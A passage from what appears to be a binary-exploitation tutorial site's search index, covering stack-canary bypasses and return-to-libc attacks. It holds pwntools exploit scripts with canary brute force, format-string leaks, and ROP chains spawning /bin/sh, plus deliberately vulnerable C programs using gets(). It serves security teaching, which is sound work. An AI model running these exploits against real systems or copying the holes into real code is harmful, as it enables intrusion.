one_gadget_approach()\n\nstack_pivot_bypass()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#advanced-bypass-techniques","title":"Advanced Bypass Techniques","text":""},{"location":"binary-exploitation/protection/02-canary-bypass/#method-6-signal-handler-exploitation","title":"Method 6: Signal Handler Exploitation","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef signal_handler_bypass():\n    \"\"\"Bypass canary using signal handlers\"\"\"\n\n    signal_exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;string.h&gt;\n\nvoid signal_handler(int sig) {\n    printf(\"Signal received: %d\\\\n\", sig);\n\n    // Signal handler has its own stack frame\n    // No canary protection here in some cases\n    char handler_buffer[100];\n    gets(handler_buffer);  // Vulnerable in signal context\n\n    printf(\"Handler completed\\\\n\");\n}\n\nvoid vulnerable_function() {\n    signal(SIGUSR1, signal_handler);\n\n    char buffer[100];\n    printf(\"Enter data: \");\n    gets(buffer);  // This has canary protection\n\n    // Trigger signal\n    kill(getpid(), SIGUSR1);\n\n    printf(\"Function completed\\\\n\");\n}\n'''\n\n    print(\"Signal handler bypass:\")\n    print(\"1. Register signal handler\")\n    print(\"2. Signal handler may lack canary protection\")\n    print(\"3. Trigger signal during execution\")\n    print(\"4. Exploit vulnerability in signal handler\")\n\ndef setjmp_longjmp_bypass():\n    \"\"\"Bypass canary using setjmp/longjmp\"\"\"\n\n    setjmp_exploit_c = '''\n#include &lt;stdio.h&gt;\n#include &lt;setjmp.h&gt;\n#include &lt;string.h&gt;\n\njmp_buf jump_buffer;\n\nvoid vulnerable_function() {\n    char buffer[100];\n\n    // setjmp saves current stack state\n    if (setjmp(jump_buffer) == 0) {\n        printf(\"Enter data: \");\n        gets(buffer);  // This can overflow\n\n        // longjmp bypasses normal return\n        longjmp(jump_buffer, 1);\n    } else {\n        printf(\"Jumped back\\\\n\");\n    }\n\n    // This return statement is never reached\n    printf(\"Function completed\\\\n\");\n}\n'''\n\n    print(\"setjmp/longjmp bypass:\")\n    print(\"1. setjmp saves stack state before overflow\")\n    print(\"2. Overflow buffer (canary gets corrupted)\")\n    print(\"3. longjmp restores old stack state\")\n    print(\"4. Bypass canary check entirely\")\n\nsignal_handler_bypass()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#method-7-exception-handler-hijacking","title":"Method 7: Exception Handler Hijacking","text":"<pre><code>#!/usr/bin/env python3\n\ndef exception_handler_bypass():\n    \"\"\"Bypass canary using exception handlers\"\"\"\n\n    exception_exploit_cpp = '''\n#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n\nclass CustomException {\npublic:\n    char data[100];\n\n    CustomException(const char* msg) {\n        strcpy(data, msg);  // Potential overflow\n    }\n};\n\nvoid vulnerable_function() {\n    char buffer[100];\n\n    try {\n        std::cin &gt;&gt; buffer;  // Stack canary protected\n\n        if (strlen(buffer) &gt; 50) {\n            throw CustomException(buffer);  // Exception object on heap\n        }\n\n        std::cout &lt;&lt; \"Normal execution\" &lt;&lt; std::endl;\n\n    } catch (CustomException&amp; e) {\n        std::cout &lt;&lt; \"Exception: \" &lt;&lt; e.data &lt;&lt; std::endl;\n        // Exception handling doesn't check stack canary\n    }\n}\n'''\n\n    print(\"Exception handler bypass:\")\n    print(\"1. Exception objects allocated on heap\")\n    print(\"2. Exception handlers may lack canary checks\")\n    print(\"3. Corrupt exception handler metadata\")\n    print(\"4. Control flow through exception mechanism\")\n\ndef structured_exception_handling():\n    \"\"\"Windows SEH bypass techniques\"\"\"\n\n    seh_exploit_c = '''\n// Windows Structured Exception Handling\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nEXCEPTION_DISPOSITION ExceptionHandler(\n    EXCEPTION_RECORD* ExceptionRecord,\n    void* EstablisherFrame,\n    CONTEXT* ContextRecord,\n    void* DispatcherContext) {\n\n    printf(\"Exception handler called\\\\n\");\n\n    // Modify context to redirect execution\n    ContextRecord-&gt;Eip = 0x41414141;  // Control EIP\n\n    return ExceptionContinueExecution;\n}\n\nvoid vulnerable_function() {\n    __try {\n        char buffer[100];\n        gets(buffer);  // Can overflow and corrupt SEH chain\n    }\n    __except(ExceptionHandler(GetExceptionInformation(), \n                             GetExceptionCode(), \n                             GetExceptionContext(), \n                             NULL)) {\n        printf(\"Exception handled\\\\n\");\n    }\n}\n'''\n\n    print(\"Windows SEH bypass:\")\n    print(\"1. Overflow corrupts SEH chain\")\n    print(\"2. Trigger exception (access violation)\")\n    print(\"3. Controlled exception handler executes\")\n    print(\"4. Modify execution context\")\n\nexception_handler_bypass()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#mitigation-evasion","title":"Mitigation Evasion","text":""},{"location":"binary-exploitation/protection/02-canary-bypass/#defeating-enhanced-canary-protections","title":"Defeating Enhanced Canary Protections","text":"<pre><code>#!/usr/bin/env python3\n\ndef enhanced_canary_evasion():\n    \"\"\"Techniques against enhanced canary protections\"\"\"\n\n    # Modern compilers use multiple canary types\n\n    def xor_canary_bypass():\n        \"\"\"Bypass XOR canaries\"\"\"\n\n        xor_canary_c = '''\n// Some implementations XOR canary with return address\nvoid function_with_xor_canary() {\n    unsigned long canary = __stack_chk_guard;\n    unsigned long return_addr = __builtin_return_address(0);\n    unsigned long xor_canary = canary ^ return_addr;\n\n    char buffer[100];\n    gets(buffer);\n\n    // Check XOR'd canary\n    if ((canary ^ __builtin_return_address(0)) != xor_canary) {\n        abort();\n    }\n}\n'''\n\n        print(\"XOR canary bypass:\")\n        print(\"1. Leak both canary and return address\")\n        print(\"2. Calculate expected XOR value\")\n        print(\"3. Craft payload preserving XOR relationship\")\n\n    def terminator_canary_info():\n        \"\"\"Information about terminator canaries\"\"\"\n\n        print(\"Terminator canary details:\")\n        print(\"- Contains null byte (0x00)\")\n        print(\"- Contains newline (0x0a)\")\n        print(\"- Contains EOF (0xff)\")\n        print(\"- Contains carriage return (0x0d)\")\n        print(\"- Designed to stop string functions\")\n        print(\"- Can still be leaked/bypassed\")\n\n    def random_canary_challenges():\n        \"\"\"Challenges with random canaries\"\"\"\n\n        print(\"Random canary challenges:\")\n        print(\"- 64-bit entropy makes bruteforce difficult\")\n        print(\"- Must be leaked or calculated\")\n        print(\"- Regenerated on fork() in some systems\")\n        print(\"- Thread-local storage protection\")\n\n    xor_canary_bypass()\n    terminator_canary_info()\n    random_canary_challenges()\n\ndef compiler_specific_bypasses():\n    \"\"\"Compiler-specific canary bypass techniques\"\"\"\n\n    gcc_specifics = {\n        'version': 'GCC canary implementation',\n        'storage': '%fs:0x28 (x86_64)',\n        'function': '__stack_chk_guard',\n        'fail_function': '__stack_chk_fail',\n        'weaknesses': [\n            'Global canary storage',\n            'Predictable location',\n            'Same across threads'\n        ]\n    }\n\n    clang_specifics = {\n        'version': 'Clang canary implementation',\n        'storage': 'Similar to GCC',\n        'function': '__stack_chk_guard',\n        'fail_function': '__stack_chk_fail',\n        'weaknesses': [\n            'Compatible with GCC',\n            'Additional optimizations may vary'\n        ]\n    }\n\n    print(\"Compiler-specific canary details:\")\n    for compiler, details in [('GCC', gcc_specifics), ('Clang', clang_specifics)]:\n        print(f\"\\n{compiler}:\")\n        for key, value in details.items():\n            if isinstance(value, list):\n                print(f\"  {key}: {', '.join(value)}\")\n            else:\n                print(f\"  {key}: {value}\")\n\nenhanced_canary_evasion()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#comprehensive-canary-bypass-framework","title":"Comprehensive Canary Bypass Framework","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\nclass CanaryBypassFramework:\n    def __init__(self, target_binary):\n        self.binary = target_binary\n        self.elf = ELF(target_binary)\n        self.canary_value = None\n\n    def detect_canary_protection(self):\n        \"\"\"Detect if binary has canary protection\"\"\"\n\n        # Check for stack_chk symbols\n        if '__stack_chk_fail' in self.elf.symbols:\n            print(\"\u2713 Stack canary protection detected\")\n            return True\n        else:\n            print(\"\u2717 No stack canary protection\")\n            return False\n\n    def attempt_format_string_leak(self):\n        \"\"\"Try to leak canary via format string\"\"\"\n\n        print(\"Attempting format string canary leak...\")\n\n        for offset in range(1, 50):\n            try:\n                p = process(self.binary)\n\n                # Try format string\n                payload = f'%{offset}$p'\n                p.sendline(payload.encode())\n\n                output = p.recvall(timeout=1)\n\n                # Look for potential canary values\n                if b'0x' in output:\n                    value_str = output.split(b'0x')[1].split()[0]\n                    try:\n                        value = int(value_str, 16)\n                        # Canary typically has null byte\n                        if (value &amp; 0xff) == 0 and value &gt; 0x1000:\n                            print(f\"Potential canary at offset {offset}: 0x{value:016x}\")\n                            self.canary_value = value\n                            return True\n                    except:\n                        pass\n\n                p.close()\n\n            except:\n                continue\n\n        return False\n\n    def attempt_bruteforce(self):\n        \"\"\"Attempt byte-by-byte bruteforce\"\"\"\n\n        print(\"Attempting canary bruteforce...\")\n\n        context.log_level = 'error'\n        canary = b''\n\n        for byte_pos in range(8):\n            found = False\n\n            for guess in range(256):\n                try:\n                    p = process(self.binary)\n\n                    # Build payload\n                    payload = b'A' * 104  # Adjust offset\n                    payload += canary + bytes([guess])\n\n                    p.sendline(payload)\n\n                    # Check if program survived\n                    try:\n                        output = p.recvall(timeout=1)\n                        if len(output) &gt; 0:\n                            canary += bytes([guess])\n                            print(f\"Found canary byte {byte_pos}: 0x{guess:02x}\")\n                            found = True\n                            break\n                    except:\n                        pass\n\n                    p.close()\n\n                except:\n                    continue\n\n            if not found:\n                print(f\"Could not bruteforce byte {byte_pos}\")\n                return False\n\n        self.canary_value = u64(canary)\n        print(f\"Bruteforced canary: 0x{self.canary_value:016x}\")\n        return True\n\n    def generate_bypass_payload(self, target_address):\n        \"\"\"Generate payload that bypasses canary\"\"\"\n\n        if not self.canary_value:\n            print(\"No canary value available\")\n            return None\n\n        payload = b'A' * 104        # Fill buffer\n        payload += p64(self.canary_value)  # Preserve canary\n        payload += b'B' * 8         # Saved RBP\n        payload += p64(target_address)     # Return address\n\n        return payload\n\n    def test_bypass(self, payload):\n        \"\"\"Test canary bypass payload\"\"\"\n\n        try:\n            p = process(self.binary)\n            p.sendline(payload)\n\n            # Check if we maintained control\n            output = p.recvall(timeout=2)\n\n            if p.returncode == 0:\n                print(\"\u2713 Canary bypass successful\")\n                return True\n            else:\n                print(\"\u2717 Canary bypass failed\")\n                return False\n\n        except:\n            print(\"\u2717 Bypass test failed\")\n            return False\n\n# Usage example\ndef demonstrate_canary_bypass():\n    \"\"\"Demonstrate comprehensive canary bypass\"\"\"\n\n    framework = CanaryBypassFramework('./vulnerable_program')\n\n    # Step 1: Detect protection\n    if not framework.detect_canary_protection():\n        print(\"No canary protection to bypass\")\n        return\n\n    # Step 2: Try leak methods\n    if not framework.attempt_format_string_leak():\n        print(\"Format string leak failed, trying bruteforce...\")\n        if not framework.attempt_bruteforce():\n            print(\"All bypass methods failed\")\n            return\n\n    # Step 3: Generate bypass payload\n    target_addr = 0x401234  # Example target address\n    payload = framework.generate_bypass_payload(target_addr)\n\n    if payload:\n        # Step 4: Test bypass\n        framework.test_bypass(payload)\n\n# demonstrate_canary_bypass()\n</code></pre>"},{"location":"binary-exploitation/protection/02-canary-bypass/#key-takeaways","title":"Key Takeaways","text":"<p>Canary Bypass Fundamentals</p> <ul> <li>Information disclosure is key - Most bypasses require leaking the canary value</li> <li>Multiple attack vectors exist - Format strings, partial overwrites, bruteforce</li> <li>Implementation details matter - Compiler and system specifics affect bypass methods</li> <li>Alternative attack paths - Stack pivots, function pointers, exception handlers</li> <li>Modern enhancements complicate bypasses - XOR canaries, random values, enhanced storage</li> </ul> <p>Common Mistakes in Bypass Attempts</p> <ul> <li>Not accounting for null bytes in canary values</li> <li>Assuming canary is at fixed offset from buffer</li> <li>Forgetting about saved frame pointer between canary and return address</li> <li>Not considering thread-local storage variations</li> <li>Overlooking compiler-specific implementation differences</li> </ul> <p>Defensive Recommendations</p> <ul> <li>Enable canaries on all functions, not just those with arrays</li> <li>Use random canaries rather than terminator canaries</li> <li>Implement additional protections beyond canaries</li> <li>Regularly update compilers for enhanced canary implementations</li> <li>Monitor for canary bypass attempts in logs</li> </ul> <p>Next: Return-to-libc Techniques</p>"},{"location":"binary-exploitation/protection/03-ret2libc/","title":"Return-to-libc Techniques","text":"<p>Return-to-libc is a code reuse attack that executes existing library functions instead of injecting new shellcode. This technique bypasses non-executable stack protections (NX/DEP) by leveraging legitimate code already present in memory.</p>"},{"location":"binary-exploitation/protection/03-ret2libc/#understanding-return-to-libc","title":"Understanding Return-to-libc","text":""},{"location":"binary-exploitation/protection/03-ret2libc/#why-return-to-libc","title":"Why Return-to-libc?","text":"<p>With NX/DEP enabled, traditional shellcode injection fails because the stack is non-executable. Return-to-libc solves this by:</p> <ol> <li>Reusing existing code - Call functions already in memory</li> <li>Bypassing NX protection - Execute legitimate library code</li> <li>Achieving similar goals - Spawn shells, execute commands</li> <li>Working with ASLR - Can be combined with information leaks</li> </ol>"},{"location":"binary-exploitation/protection/03-ret2libc/#basic-concept","title":"Basic Concept","text":"<pre><code>Traditional Shellcode vs Return-to-libc:\n\nShellcode Injection (Blocked by NX):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Buffer Overflow     \u2502 \u2192 Overwrite return address\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Return to Stack     \u2502 \u2192 Points to injected shellcode\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Shellcode on Stack  \u2502 \u2192 BLOCKED: Stack not executable\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nReturn-to-libc (Bypasses NX):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Buffer Overflow     \u2502 \u2192 Overwrite return address\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Return to libc      \u2502 \u2192 Points to system() function\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Function Arguments  \u2502 \u2192 \"/bin/sh\" string\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#basic-return-to-libc-attack","title":"Basic Return-to-libc Attack","text":""},{"location":"binary-exploitation/protection/03-ret2libc/#simple-system-call","title":"Simple system() Call","text":"<pre><code>// vuln_ret2libc.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[64];\n\n    printf(\"Enter input: \");\n    gets(buffer);  // Vulnerable to buffer overflow\n\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    printf(\"System function at: %p\\n\", system);\n    printf(\"Exit function at: %p\\n\", exit);\n\n    vulnerable_function();\n\n    return 0;\n}\n</code></pre> <p>Compilation: <pre><code># Disable modern protections for learning\ngcc -fno-stack-protector -no-pie -z execstack -o vuln_ret2libc vuln_ret2libc.c\n\n# Check protections\nchecksec vuln_ret2libc\n</code></pre></p>"},{"location":"binary-exploitation/protection/03-ret2libc/#basic-exploitation","title":"Basic Exploitation","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef basic_ret2libc():\n    \"\"\"Basic return-to-libc attack calling system()\"\"\"\n\n    context.arch = 'amd64'\n\n    # Start the process\n    p = process('./vuln_ret2libc')\n\n    # Receive the function addresses printed by the program\n    output = p.recvuntil(b'Enter input: ')\n    print(output.decode())\n\n    # Parse addresses (in real attack, these would be leaked)\n    # For now, we'll use static analysis\n\n    elf = ELF('./vuln_ret2libc')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust path\n\n    # Find system address (if linked statically or known offset)\n    system_addr = elf.plt['system']  # PLT entry\n\n    # Find \"/bin/sh\" string in libc\n    # We need to either have it in the binary or calculate from libc base\n    binsh_str = next(elf.search(b'/bin/sh\\x00'))  # If present in binary\n\n    print(f\"system() PLT: 0x{system_addr:x}\")\n    print(f\"/bin/sh string: 0x{binsh_str:x}\")\n\n    # Build ROP chain\n    # For x86_64: system(arg1) where arg1 is in RDI\n\n    # Find gadget to set RDI\n    rop = ROP(elf)\n    rop.system(binsh_str)\n\n    # Build payload\n    offset = 72  # Distance to return address\n    payload = b'A' * offset\n    payload += rop.chain()\n\n    # Send payload\n    p.sendline(payload)\n\n    # Interact with shell\n    p.interactive()\n\ndef manual_ret2libc():\n    \"\"\"Manual return-to-libc without pwntools automation\"\"\"\n\n    # Find addresses manually\n    elf = ELF('./vuln_ret2libc')\n\n    # System function address (from PLT)\n    system_plt = elf.plt['system']\n\n    # Need to find \"/bin/sh\" string\n    # Method 1: If it exists in the binary\n    try:\n        binsh_addr = next(elf.search(b'/bin/sh\\x00'))\n        print(f\"Found /bin/sh in binary: 0x{binsh_addr:x}\")\n    except:\n        # Method 2: Use environment variables\n        # \"/bin/sh\" might be in environment\n        binsh_addr = 0x7fffffffe000  # Example environment address\n        print(f\"Using environment /bin/sh: 0x{binsh_addr:x}\")\n\n    # For x86_64, need ROP gadget to set RDI\n    # Find \"pop rdi; ret\" gadget\n    pop_rdi_ret = None\n\n    # Search for pop rdi gadget\n    for addr in elf.search(asm('pop rdi; ret')):\n        pop_rdi_ret = addr\n        break\n\n    if not pop_rdi_ret:\n        print(\"No pop rdi gadget found, trying alternatives...\")\n        # Look for other ways to set RDI\n        return\n\n    print(f\"pop rdi; ret gadget: 0x{pop_rdi_ret:x}\")\n\n    # Build exploit\n    p = process('./vuln_ret2libc')\n    p.recvuntil(b'Enter input: ')\n\n    offset = 72\n    payload = b'A' * offset\n\n    # ROP chain: pop rdi; ret -&gt; \"/bin/sh\" -&gt; system\n    payload += p64(pop_rdi_ret)    # pop rdi; ret\n    payload += p64(binsh_addr)     # \"/bin/sh\" argument\n    payload += p64(system_plt)     # system() function\n\n    p.sendline(payload)\n    p.interactive()\n\nbasic_ret2libc()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#advanced-return-to-libc-techniques","title":"Advanced Return-to-libc Techniques","text":""},{"location":"binary-exploitation/protection/03-ret2libc/#ret2plt-using-plt-entries","title":"ret2plt - Using PLT Entries","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef ret2plt_attack():\n    \"\"\"Use PLT entries to call library functions\"\"\"\n\n    context.arch = 'amd64'\n    elf = ELF('./vuln_ret2libc')\n\n    # PLT entries are stub functions that resolve to actual library functions\n    plt_entries = {\n        'system': elf.plt.get('system'),\n        'printf': elf.plt.get('printf'),\n        'puts': elf.plt.get('puts'),\n        'exit': elf.plt.get('exit'),\n    }\n\n    print(\"Available PLT entries:\")\n    for func, addr in plt_entries.items():\n        if addr:\n            print(f\"  {func}: 0x{addr:x}\")\n\n    # Strategy: Use printf to leak addresses, then call system\n    def leak_and_exploit():\n        \"\"\"Two-stage attack: leak then exploit\"\"\"\n\n        # Stage 1: Leak libc addresses using printf\n        p = process('./vuln_ret2libc')\n        p.recvuntil(b'Enter input: ')\n\n        # Find GOT entry to leak\n        printf_got = elf.got['printf']\n        printf_plt = elf.plt['printf']\n\n        # Find format string for printf\n        format_str = next(elf.search(b'%p\\x00'))  # Look for \"%p\" format\n\n        # ROP chain to call printf(format, got_entry)\n        pop_rdi = 0x401234  # Example pop rdi gadget\n        pop_rsi = 0x401567  # Example pop rsi gadget\n        main_addr = elf.symbols['main']  # Return to main for second exploit\n\n        payload = b'A' * 72\n        payload += p64(pop_rdi)\n        payload += p64(format_str)\n        payload += p64(pop_rsi)\n        payload += p64(printf_got)\n        payload += p64(printf_plt)\n        payload += p64(main_addr)  # Return to main\n\n        p.sendline(payload)\n\n        # Receive leaked address\n        leak = p.recvline()\n        leaked_printf = int(leak.strip(), 16)\n\n        print(f\"Leaked printf address: 0x{leaked_printf:x}\")\n\n        # Calculate libc base\n        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n        libc_base = leaked_printf - libc.symbols['printf']\n        system_addr = libc_base + libc.symbols['system']\n        binsh_addr = libc_base + next(libc.search(b'/bin/sh\\x00'))\n\n        print(f\"Calculated system: 0x{system_addr:x}\")\n        print(f\"Calculated /bin/sh: 0x{binsh_addr:x}\")\n\n        # Stage 2: Call system with known addresses\n        p.recvuntil(b'Enter input: ')\n\n        payload2 = b'A' * 72\n        payload2 += p64(pop_rdi)\n        payload2 += p64(binsh_addr)\n        payload2 += p64(system_addr)\n\n        p.sendline(payload2)\n        p.interactive()\n\n    leak_and_exploit()\n\ndef ret2got_attack():\n    \"\"\"Attack using GOT overwrites\"\"\"\n\n    elf = ELF('./vuln_ret2libc')\n\n    # Global Offset Table contains actual addresses of library functions\n    got_entries = {\n        'system': elf.got.get('system'),\n        'printf': elf.got.get('printf'),\n        'puts': elf.got.get('puts'),\n    }\n\n    print(\"GOT entries:\")\n    for func, addr in got_entries.items():\n        if addr:\n            print(f\"  {func}: 0x{addr:x}\")\n\n    # Strategy: Overwrite GOT entry to redirect function calls\n    def got_overwrite_strategy():\n        \"\"\"Overwrite GOT to redirect function calls\"\"\"\n\n        print(\"GOT overwrite strategy:\")\n        print(\"1. Use format string vulnerability to write to GOT\")\n        print(\"2. Overwrite printf@got with system address\")\n        print(\"3. Call printf with '/bin/sh' argument\")\n        print(\"4. Actually executes system('/bin/sh')\")\n\n        # This requires a format string vulnerability for writing\n        # Combined with buffer overflow for control\n\n    got_overwrite_strategy()\n\nret2plt_attack()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#ret2libc-with-chained-calls","title":"ret2libc with Chained Calls","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef chained_ret2libc():\n    \"\"\"Chain multiple library function calls\"\"\"\n\n    context.arch = 'amd64'\n    elf = ELF('./vuln_ret2libc')\n\n    def multiple_function_calls():\n        \"\"\"Call multiple functions in sequence\"\"\"\n\n        # Example: printf(\"Hello\") -&gt; system(\"/bin/sh\")\n\n        pop_rdi = 0x401234  # pop rdi; ret gadget\n        printf_plt = elf.plt['printf']\n        system_plt = elf.plt['system']\n\n        # Find strings\n        hello_str = next(elf.search(b'Hello\\x00'))\n        binsh_str = next(elf.search(b'/bin/sh\\x00'))\n\n        payload = b'A' * 72\n\n        # First call: printf(\"Hello\")\n        payload += p64(pop_rdi)\n        payload += p64(hello_str)\n        payload += p64(printf_plt)\n\n        # Second call: system(\"/bin/sh\")\n        payload += p64(pop_rdi)\n        payload += p64(binsh_str)\n        payload += p64(system_plt)\n\n        return payload\n\n    def function_with_multiple_args():\n        \"\"\"Call function with multiple arguments\"\"\"\n\n        # Example: execve(\"/bin/sh\", argv, envp)\n\n        # x86_64 calling convention: RDI, RSI, RDX, RCX, R8, R9\n        pop_rdi = 0x401234  # pop rdi; ret\n        pop_rsi = 0x401567  # pop rsi; ret  \n        pop_rdx = 0x401890  # pop rdx; ret\n\n        execve_addr = 0x7ffff7a52390  # Example execve address\n        binsh_addr = 0x7ffff7b97e9a   # \"/bin/sh\" string\n        null_ptr = 0x404800           # NULL pointer\n\n        payload = b'A' * 72\n\n        # Set up arguments: execve(\"/bin/sh\", NULL, NULL)\n        payload += p64(pop_rdi)       # First argument\n        payload += p64(binsh_addr)\n        payload += p64(pop_rsi)       # Second argument\n        payload += p64(null_ptr)\n        payload += p64(pop_rdx)       # Third argument\n        payload += p64(null_ptr)\n        payload += p64(execve_addr)   # Call execve\n\n        return payload\n\n    print(\"Chained function call examples:\")\n    print(\"1. Multiple single-argument functions\")\n    print(\"2. Single function with multiple arguments\")\n\ndef ret2libc_with_stack_setup():\n    \"\"\"ret2libc with proper stack frame setup\"\"\"\n\n    def setup_fake_stack_frame():\n        \"\"\"Set up fake stack frame for function call\"\"\"\n\n        # Some functions expect proper stack frame setup\n        # Especially when calling complex library functions\n\n        fake_frame_c = '''\n        // Function expecting stack frame\n        void complex_function(char *cmd) {\n            char local_buffer[100];\n            sprintf(local_buffer, \"Executing: %s\", cmd);\n            system(cmd);\n        }\n        '''\n\n        print(\"Stack frame setup for complex functions:\")\n        print(\"1. Set up fake saved RBP\")\n        print(\"2. Ensure stack alignment (16-byte boundary)\")\n        print(\"3. Account for local variables\")\n        print(\"4. Proper argument passing\")\n\n        # Stack alignment is crucial for x86_64\n        # Stack must be 16-byte aligned before call instruction\n\n        ret_gadget = 0x401000     # Simple ret gadget for alignment\n        pop_rdi = 0x401234        # pop rdi; ret\n        system_addr = 0x7ffff7a52390\n        binsh_addr = 0x7ffff7b97e9a\n\n        payload = b'A' * 72\n\n        # Ensure 16-byte stack alignment\n        payload += p64(ret_gadget)    # Extra ret for alignment\n        payload += p64(pop_rdi)\n        payload += p64(binsh_addr)\n        payload += p64(system_addr)\n\n        return payload\n\n    setup_fake_stack_frame()\n\nchained_ret2libc()\n</code></pre>"},{"location":"binary-exploitation/protection/03-ret2libc/#aslr-bypass-techniques","title":"ASLR Bypass Techniques","text":""},{"location":"binary-exploitation/protection/03-ret2libc/#information-disclosure-for-aslr-bypass","title":"Information Disclosure for ASLR Bypass","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef aslr_bypass_ret2libc():\n    \"\"\"Bypass ASLR for return-to-libc attacks\"\"\"\n\n    def leak_libc_base():\n        \"\"\"Leak libc base address to calculate function addresses\"\"\"\n\n        # Method 1: Use puts to leak GOT entries\n        def puts_leak_method():\n            \"\"\"Use puts() to leak libc addresses\"\"\"\n\n            elf = ELF('./vuln_ret2libc')\n\n            # puts() prints string at address\n            # We can use it to print GOT entries (which contain libc addresses)\n\n            puts_plt = elf.plt['puts']\n            puts_got = elf.got['puts']\n            main_addr = elf.symbols['main']\n            pop_rdi = 0x401234  # pop rdi; ret gadget\n\n            print(\"puts() leak strategy:\")\n            print(\"1. Call puts(puts@got) to leak puts address\")\n            print(\"2. Calculate libc base from leaked address\")\n            print(\"3. Return to main for second exploitation\")\n\n            # Stage 1 payload: leak libc address\n            payload1 = b'A' * 72\n            payload1 += p64(pop_rdi)\n            payload1 += p64(puts_got)     # Address to print\n            payload1 += p64(puts_plt)     # Call puts\n            payload1 += p64(main_addr)    # Return to main\n\n            return payload1\n\n        def printf_leak_method():\n            \"\"\"Use printf() to leak addresses\"\"\"\n\n            elf = ELF('./vuln_ret2libc')\n\n            printf_plt = elf.plt['printf']\n            printf_got = elf.got['printf']\n\n            # Need format string\n            format_str = next(elf.search(b'%p\\x00'))  # Find \"%p\" format\n\n            pop_rdi = 0x401234    # pop rdi; ret\n            pop_rsi = 0x401567    # pop rsi; ret\n            main_addr = elf.symbols['main']\n\n            print(\"printf() leak strategy:\")\n            print(\"1. Call printf('%p', target_got) to leak address\")\n            print(\"2. Parse printed hex value\")\n            print(\"3. Calculate libc base\")\n\n            # Stage 1 payload: leak using printf\n            payload1 = b'A' * 72\n            payload1 += p64(pop_rdi)\n            payload1 += p64(format_str)   # \"%p\" format string\n            payload1 += p64(pop_rsi)\n            payload1 += p64(printf_got)   # Address to leak\n            payload1 += p64(printf_plt)   # Call printf\n            payload1 += p64(main_addr)    # Return to main\n\n            return payload1\n\n        puts_leak_method()\n        printf_leak_method()\n\n    def complete_aslr_bypass():\n        \"\"\"Complete ASLR bypass + ret2libc exploit\"\"\"\n\n        context.arch = 'amd64'\n\n        # This example assumes we have format string + buffer overflow\n        p = process('./vuln_ret2libc')\n\n        # Stage 1: Leak libc address\n        elf = ELF('./vuln_ret2libc')\n        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\n        puts_plt = elf.plt['puts']\n        puts_got = elf.got['puts']\n        main_addr = elf.symbols['main']\n        pop_rdi_ret = 0x401234  # Found using ROPgadget\n\n        p.recvuntil(b'Enter input: ')\n\n        # Leak payload\n        leak_payload = b'A' * 72\n        leak_payload += p64(pop_rdi_ret)\n        leak_payload += p64(puts_got)\n        leak_payload += p64(puts_plt)\n        leak_payload += p64(main_addr)\n\n        p.sendline(leak_payload)\n\n        # Receive leaked address\n        leaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))\n        print(f\"Leaked puts: 0x{leaked_puts:x}\")\n\n        # Calculate libc base\n        libc_base = leaked_puts - libc.symbols['puts']\n        system_addr = libc_base + libc.symbols['system']\n        binsh_addr = libc_base + next(libc.search(b'/bin/sh\\x00'))\n\n        print(f\"Libc base: 0x{libc_base:x}\")\n        print(f\"System: 0x{system_addr:x}\")\n        print(f\"/bin/sh: 0x{binsh_addr:x}\")\n\n        # Stage 2: Exploit with known addresses\n        p.recvuntil(b'Enter input: ')\n\n        exploit_payload = b'A' * 72\n        exploit_payload += p64(pop_rdi_ret)\n        exploit_payload += p64(binsh_addr)\n        exploit_payload += p64(system_addr)\n\n        p.sendline(exploit_payload)\n        p.interactive()\n\n    